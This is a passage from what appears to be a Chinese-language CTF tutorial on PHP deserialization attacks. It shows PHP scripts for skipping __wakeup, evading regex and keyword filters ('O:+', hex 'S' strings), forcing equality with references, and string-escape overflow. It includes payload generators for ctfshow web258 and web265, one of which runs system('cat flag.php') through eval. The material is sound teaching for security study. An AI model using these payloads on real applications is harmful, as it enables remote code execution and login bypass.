+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><span class="cp">&lt;?php</span>
+</span><span id="__span-11-2"><span class="k">class</span> <span class="nc">test</span>
+</span><span id="__span-11-3"><span class="p">{</span>
+</span><span id="__span-11-4">    <span class="k">protected</span> <span class="nv">$a</span><span class="p">;</span>
+</span><span id="__span-11-5">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+</span><span id="__span-11-6">    <span class="p">{</span>
+</span><span id="__span-11-7">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span> <span class="o">=</span> <span class="s1">&#39;abc&#39;</span><span class="p">;</span>
+</span><span id="__span-11-8">    <span class="p">}</span>
+</span><span id="__span-11-9">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+</span><span id="__span-11-10">    <span class="p">{</span>
+</span><span id="__span-11-11">        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="p">;</span>
+</span><span id="__span-11-12">    <span class="p">}</span>
+</span><span id="__span-11-13"><span class="p">}</span>
+</span><span id="__span-11-14"><span class="nb">unserialize</span><span class="p">(</span><span class="s1">&#39;O:4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:3:&quot;abc&quot;;}&#39;</span><span class="p">);</span>
+</span></code></pre></div></td></tr></table></div>
+<h3 id="__wakeup">绕过__wakeup<a class="headerlink" href="#__wakeup" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p><strong>版本：</strong>
+• PHP5 &lt; 5.6.25
+• PHP7 &lt; 7.0.10</p>
+</blockquote>
+<p><strong>利用方式：</strong>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</p>
+<p>例如：</p>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><span class="cp">&lt;?php</span>
+</span><span id="__span-12-2"><span class="k">class</span> <span class="nc">test</span>
+</span><span id="__span-12-3"><span class="p">{</span>
+</span><span id="__span-12-4">    <span class="k">public</span> <span class="nv">$a</span><span class="p">;</span>
+</span><span id="__span-12-5">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+</span><span id="__span-12-6">    <span class="p">{</span>
+</span><span id="__span-12-7">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span> <span class="o">=</span> <span class="s1">&#39;abc&#39;</span><span class="p">;</span>
+</span><span id="__span-12-8">    <span class="p">}</span>
+</span><span id="__span-12-9">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span>
+</span><span id="__span-12-10">    <span class="p">{</span>
+</span><span id="__span-12-11">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span> <span class="o">=</span> <span class="s1">&#39;666&#39;</span><span class="p">;</span>
+</span><span id="__span-12-12">    <span class="p">}</span>
+</span><span id="__span-12-13">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+</span><span id="__span-12-14">    <span class="p">{</span>
+</span><span id="__span-12-15">        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="p">;</span>
+</span><span id="__span-12-16">    <span class="p">}</span>
+</span><span id="__span-12-17"><span class="p">}</span>
+</span></code></pre></div></td></tr></table></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1">如果执行unserialize(&#39;O:4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:3:&quot;abc&quot;;}&#39;);输出结果为666
+</span><span id="__span-13-2">
+</span><span id="__span-13-3">而把对象属性个数的值增大：
+</span><span id="__span-13-4">执行unserialize(&#39;O:4:&quot;test&quot;:2:{s:1:&quot;a&quot;;s:3:&quot;abc&quot;;}&#39;);输出结果为abc
+</span></code></pre></div></td></tr></table></div>
+<h3 id="_7">绕过部分正则<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
+<p><strong>正则表达式：</strong>描述了一种字符串匹配的模式（pattern），可以用来检查一个串是否含有某种子串、将匹配的子串替换或者从某个串中取出符合某个条件的子串等。</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1">preg_match(&#39;/^O:\d+/&#39;)
+</span><span id="__span-14-2">//匹配序列化字符串是否是对象字符串开头
+</span></code></pre></div></td></tr></table></div>
+<p>利用加号绕过（在url传参时注意+编码为<code>%2B</code>）</p>
+<p><code>serialize(array(a))</code> a为要反序列化的对象(序列化结果开头是a，不影响作为数组元素的$a的析构)</p>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><span class="cp">&lt;?php</span>
+</span><span id="__span-15-2"><span class="k">class</span> <span class="nc">test</span>
+</span><span id="__span-15-3"><span class="p">{</span>
+</span><span id="__span-15-4">    <span class="k">public</span> <span class="nv">$a</span><span class="p">;</span>
+</span><span id="__span-15-5">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+</span><span id="__span-15-6">    <span class="p">{</span>
+</span><span id="__span-15-7">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span> <span class="o">=</span> <span class="s1">&#39;abc&#39;</span><span class="p">;</span>
+</span><span id="__span-15-8">    <span class="p">}</span>
+</span><span id="__span-15-9">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+</span><span id="__span-15-10">    <span class="p">{</span>
+</span><span id="__span-15-11">        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span> <span class="o">.</span> <span class="nx">PHP_EOL</span><span class="p">;</span>
+</span><span id="__span-15-12">    <span class="p">}</span>
+</span><span id="__span-15-13"><span class="p">}</span>
+</span><span id="__span-15-14">
+</span><span id="__span-15-15"><span class="k">function</span> <span class="nf">match</span><span class="p">(</span><span class="nv">$data</span><span class="p">){</span>
+</span><span id="__span-15-16">    <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/^O:\d+/&#39;</span><span class="p">,</span><span class="nv">$data</span><span class="p">)){</span>
+</span><span id="__span-15-17">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;you lose!&#39;</span><span class="p">);</span>
+</span><span id="__span-15-18">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span><span id="__span-15-19">        <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
+</span><span id="__span-15-20">    <span class="p">}</span>
+</span><span id="__span-15-21"><span class="p">}</span>
+</span><span id="__span-15-22">
+</span><span id="__span-15-23"><span class="nv">$a</span> <span class="o">=</span> <span class="s1">&#39;O:4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:3:&quot;abc&quot;;}&#39;</span><span class="p">;</span>
+</span><span id="__span-15-24"><span class="c1">// +号绕过</span>
+</span><span id="__span-15-25"><span class="nv">$b</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">&#39;O:4&#39;</span><span class="p">,</span> <span class="s1">&#39;O:+4&#39;</span><span class="p">,</span> <span class="nv">$a</span><span class="p">);</span>
+</span><span id="__span-15-26"><span class="nb">unserialize</span><span class="p">(</span><span class="k">match</span><span class="p">(</span><span class="nv">$b</span><span class="p">));</span>
+</span><span id="__span-15-27"><span class="nb">serialize</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
+</span><span id="__span-15-28"><span class="nb">unserialize</span><span class="p">(</span><span class="s1">&#39;a:1:{i:0;O:4:&quot;test&quot;:1:{s:1:&quot;a&quot;;s:3:&quot;abc&quot;;}}&#39;</span><span class="p">);</span>
+</span><span id="__span-15-29">
+</span><span id="__span-15-30"><span class="cp">?&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<p>对应 <strong>ctfshow web258</strong></p>
+<p>编写脚本：</p>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-16-1"><span class="cp">&lt;?php</span>
+</span><span id="__span-16-2"><span class="k">class</span> <span class="nc">ctfShowUser</span>
+</span><span id="__span-16-3"><span class="p">{</span>
+</span><span id="__span-16-4">    <span class="k">public</span> <span class="nv">$username</span> <span class="o">=</span> <span class="s1">&#39;xxxxxx&#39;</span><span class="p">;</span>
+</span><span id="__span-16-5">    <span class="k">public</span> <span class="nv">$password</span> <span class="o">=</span> <span class="s1">&#39;xxxxxx&#39;</span><span class="p">;</span>
+</span><span id="__span-16-6">    <span class="k">public</span> <span class="nv">$isVip</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+</span><span id="__span-16-7">    <span class="k">public</span> <span class="nv">$class</span> <span class="o">=</span> <span class="s1">&#39;backDoor&#39;</span><span class="p">;</span>
+</span><span id="__span-16-8">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+</span><span id="__span-16-9">    <span class="p">{</span>
+</span><span id="__span-16-10">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">class</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">backDoor</span><span class="p">();</span>
+</span><span id="__span-16-11">    <span class="p">}</span>
+</span><span id="__span-16-12">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+</span><span id="__span-16-13">    <span class="p">{</span>
+</span><span id="__span-16-14">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">class</span><span class="o">-&gt;</span><span class="na">getInfo</span><span class="p">();</span>
+</span><span id="__span-16-15">    <span class="p">}</span>
+</span><span id="__span-16-16"><span class="p">}</span>
+</span><span id="__span-16-17"><span class="k">class</span> <span class="nc">backDoor</span>
+</span><span id="__span-16-18"><span class="p">{</span>
+</span><span id="__span-16-19">    <span class="k">public</span> <span class="nv">$code</span> <span class="o">=</span> <span class="s1">&#39;system(&quot;cat flag.php&quot;);&#39;</span><span class="p">;</span>
+</span><span id="__span-16-20">    <span class="k">public</span> <span class="k">function</span> <span class="nf">getInfo</span><span class="p">()</span>
+</span><span id="__span-16-21">    <span class="p">{</span>
+</span><span id="__span-16-22">        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">code</span><span class="p">);</span>
+</span><span id="__span-16-23">    <span class="p">}</span>
+</span><span id="__span-16-24"><span class="p">}</span>
+</span><span id="__span-16-25"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ctfShowUser</span><span class="p">();</span>
+</span><span id="__span-16-26"><span class="nv">$a</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span><span id="__span-16-27"><span class="nv">$a</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">&#39;O:&#39;</span><span class="p">,</span> <span class="s1">&#39;O:+&#39;</span><span class="p">,</span> <span class="nv">$a</span><span class="p">);</span> <span class="c1">//绕过preg_match</span>
+</span><span id="__span-16-28"><span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span><span id="__span-16-29"><span class="cp">?&gt;</span>
+</span><span id="__span-16-30"><span class="x">//主要是调用backDoor执行eval命令函数获取flag</span>
+</span></code></pre></div></td></tr></table></div>
+<h3 id="_8">利用引用<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-17-1"><span class="cp">&lt;?php</span>
+</span><span id="__span-17-2"><span class="k">class</span> <span class="nc">test</span>
+</span><span id="__span-17-3"><span class="p">{</span>
+</span><span id="__span-17-4">    <span class="k">public</span> <span class="nv">$a</span><span class="p">;</span>
+</span><span id="__span-17-5">    <span class="k">public</span> <span class="nv">$b</span><span class="p">;</span>
+</span><span id="__span-17-6">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+</span><span id="__span-17-7">    <span class="p">{</span>
+</span><span id="__span-17-8">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span> <span class="o">=</span> <span class="s1">&#39;abc&#39;</span><span class="p">;</span>
+</span><span id="__span-17-9">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">b</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="p">;</span>
+</span><span id="__span-17-10">    <span class="p">}</span>
+</span><span id="__span-17-11">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+</span><span id="__span-17-12">    <span class="p">{</span>
+</span><span id="__span-17-13">        <span class="k">if</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span> <span class="o">===</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">b</span><span class="p">)</span> <span class="p">{</span>
+</span><span id="__span-17-14">            <span class="k">echo</span> <span class="mi">666</span><span class="p">;</span>
+</span><span id="__span-17-15">        <span class="p">}</span>
+</span><span id="__span-17-16">    <span class="p">}</span>
+</span><span id="__span-17-17"><span class="p">}</span>
+</span><span id="__span-17-18"><span class="nv">$a</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">test</span><span class="p">());</span>
+</span></code></pre></div></td></tr></table></div>
+<p>上面这个例子将 <code>$b</code> 设置为 <code>$a</code> 的引用，可以使 <code>$a</code> 永远与 <code>$b</code> 相等</p>
+<p>对应于<strong>ctfshow 265</strong></p>
+<p>脚本代码：</p>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-18-1"><span class="cp">&lt;?php</span>
+</span><span id="__span-18-2"><span class="k">class</span> <span class="nc">ctfshowAdmin</span>
+</span><span id="__span-18-3"><span class="p">{</span>
+</span><span id="__span-18-4">    <span class="k">public</span> <span class="nv">$token</span><span class="p">;</span>
+</span><span id="__span-18-5">    <span class="k">public</span> <span class="nv">$password</span><span class="p">;</span>
+</span><span id="__span-18-6">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$t</span><span class="p">,</span> <span class="nv">$p</span><span class="p">)</span>
+</span><span id="__span-18-7">    <span class="p">{</span>
+</span><span id="__span-18-8">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">token</span> <span class="o">=</span> <span class="nv">$t</span><span class="p">;</span>
+</span><span id="__span-18-9">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">token</span><span class="p">;</span>
+</span><span id="__span-18-10">    <span class="p">}</span>
+</span><span id="__span-18-11">    <span class="k">public</span> <span class="k">function</span> <span class="nf">login</span><span class="p">()</span>
+</span><span id="__span-18-12">    <span class="p">{</span>
+</span><span id="__span-18-13">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">token</span> <span class="o">===</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">password</span><span class="p">;</span>
+</span><span id="__span-18-14">    <span class="p">}</span>
+</span><span id="__span-18-15"><span class="p">}</span>
+</span><span id="__span-18-16">
+</span><span id="__span-18-17"><span class="nv">$a</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="k">new</span> <span class="nx">ctfshowAdmin</span><span class="p">(</span><span class="s1">&#39;123&#39;</span><span class="p">,</span> <span class="s1">&#39;123&#39;</span><span class="p">));</span>
+</span><span id="__span-18-18"><span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></code></pre></div></td></tr></table></div>
+<h3 id="16">16进制绕过字符的过滤<a class="headerlink" href="#16" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-19-1">O:4:&quot;test&quot;:2:{s:4:&quot;%00*%00a&quot;;s:3:&quot;abc&quot;;s:7:&quot;%00test%00b&quot;;s:3:&quot;def&quot;;}
+</span><span id="__span-19-2">可以写成
+</span><span id="__span-19-3">O:4:&quot;test&quot;:2:{S:4:&quot;\00*\00\61&quot;;s:3:&quot;abc&quot;;s:7:&quot;%00test%00b&quot;;s:3:&quot;def&quot;;}
+</span><span id="__span-19-4">表示字符类型的s大写时，会被当成16进制解析。
+</span><span id="__span-19-5">61(16进制)-&gt;97(十进制)-&gt;a(ASCII)
+</span></code></pre></div></td></tr></table></div>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-20-1"><span class="cp">&lt;?php</span>
+</span><span id="__span-20-2"><span class="k">class</span> <span class="nc">test</span>
+</span><span id="__span-20-3"><span class="p">{</span>
+</span><span id="__span-20-4">    <span class="k">public</span> <span class="nv">$username</span><span class="p">;</span>
+</span><span id="__span-20-5">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
+</span><span id="__span-20-6">    <span class="p">{</span>
+</span><span id="__span-20-7">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">username</span> <span class="o">=</span> <span class="s1">&#39;admin&#39;</span><span class="p">;</span>
+</span><span id="__span-20-8">    <span class="p">}</span>
+</span><span id="__span-20-9">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+</span><span id="__span-20-10">    <span class="p">{</span>
+</span><span id="__span-20-11">        <span class="k">echo</span> <span class="mi">666</span><span class="p">;</span>
+</span><span id="__span-20-12">    <span class="p">}</span>
+</span><span id="__span-20-13"><span class="p">}</span>
+</span><span id="__span-20-14"><span class="k">function</span> <span class="nf">check</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span>
+</span><span id="__span-20-15"><span class="p">{</span>
+</span><span id="__span-20-16">    <span class="k">if</span> <span class="p">(</span><span class="nb">stristr</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="s1">&#39;username&#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">False</span><span class="p">)</span> <span class="p">{</span>
+</span><span id="__span-20-17">        <span class="k">echo</span> <span class="p">(</span><span class="s2">&quot;你绕不过！！&quot;</span> <span class="o">.</span> <span class="nx">PHP_EOL</span><span class="p">);</span>
+</span><span id="__span-20-18">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span id="__span-20-19">        <span class="k">return</span> <span class="nv">$data</span><span class="p">;</span>
+</span><span id="__span-20-20">    <span class="p">}</span>
+</span><span id="__span-20-21"><span class="p">}</span>
+</span><span id="__span-20-22"><span class="c1">// 未作处理前</span>
+</span><span id="__span-20-23"><span class="nv">$a</span> <span class="o">=</span> <span class="s1">&#39;O:4:&quot;test&quot;:1:{s:8:&quot;username&quot;;s:5:&quot;admin&quot;;}&#39;</span><span class="p">;</span>
+</span><span id="__span-20-24"><span class="nv">$a</span> <span class="o">=</span> <span class="nx">check</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span><span id="__span-20-25"><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span><span id="__span-20-26"><span class="c1">// 做处理后 \75是u的16进制</span>
+</span><span id="__span-20-27"><span class="nv">$a</span> <span class="o">=</span> <span class="s1">&#39;O:4:&quot;test&quot;:1:{S:8:&quot;\\75sername&quot;;s:5:&quot;admin&quot;;}&#39;</span><span class="p">;</span>
+</span><span id="__span-20-28"><span class="nv">$a</span> <span class="o">=</span> <span class="nx">check</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span><span id="__span-20-29"><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span><span id="__span-20-30"><span class="cp">?&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<h3 id="php_1">PHP反序列化字符逃逸<a class="headerlink" href="#php_1" title="Permanent link">&para;</a></h3>
+<h4 id="1-x"><strong>1. 过滤后字符变多（反序列化后的一个x替换成为两个）</strong><a class="headerlink" href="#1-x" title="Permanent link">&para;</a></h4>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-21-1"><span class="cp">&lt;?php</span>
+</span><span id="__span-21-2"><span class="k">function</span> <span class="nf">change</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span>
+</span><span id="__span-21-3"><span class="p">{</span>
+</span><span id="__span-21-4">    <span class="k">return</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;x&quot;</span><span class="p">,</span> <span class="s2">&quot;xx&quot;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">);</span>
+</span><span id="__span-21-5"><span class="p">}</span>
+</span><span id="__span-21-6">
+</span><span id="__span-21-7"><span class="nv">$name</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
+</span><span id="__span-21-8"><span class="nv">$age</span> <span class="o">=</span> <span class="s2">&quot;I am 11&quot;</span><span class="p">;</span>
+</span><span id="__span-21-9"><span class="nv">$arr</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$age</span><span class="p">);</span>
+</span><span id="__span-21-10"><span class="k">echo</span> <span class="s2">&quot;反序列化字符串：&quot;</span><span class="p">;</span>
+</span><span id="__span-21-11"><span class="nb">var_dump</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$arr</span><span class="p">));</span>
+</span><span id="__span-21-12"><span class="k">echo</span> <span class="s2">&quot;&lt;br/&gt;&quot;</span><span class="p">;</span>
+</span><span id="__span-21-13"><span class="k">echo</span> <span class="s2">&quot;过滤后:&quot;</span><span class="p">;</span>
+</span><span id="__span-21-14"><span class="nv">$old</span> <span class="o">=</span> <span class="nx">change</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$arr</span><span class="p">));</span>
+</span><span id="__span-21-15"><span class="nv">$new</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$old</span><span class="p">);</span>
+</span><span id="__span-21-16"><span class="nb">var_dump</span><span class="p">(</span><span class="nv">$new</span><span class="p">);</span>
+</span><span id="__span-21-17"><span class="k">echo</span> <span class="s2">&quot;&lt;br/&gt;此时，age=</span><span class="si">$new[1]</span><span class="s2">&quot;</span><span class="p">;</span>
+</span></code></pre></div></td></tr></table></div>
+<p>正常输出如下</p>
+<p><img alt="1" src="../PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/1.jpg" /></p>
+<p>添加一个x看看：</p>
+<p><img alt="2" src="../PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/2.jpg" /></p>
+<p>这个就是将GET传入的name中的 x 改为了 xx</p>
+<p>正常传入不含x的name值就会正常显示</p>
+<p>例如：?name=mao，此时长度为3</p>
+<p>如果我们传入maox，正常情况下他的长度就是4，但是经过change函数的替换，变成了abcxx，导致溢出（长度大于4），进而影响下面的反序列化</p>
+<p>我们可以利用这一点来实现字符串逃逸</p>
+<p><strong>构造：</strong></p>
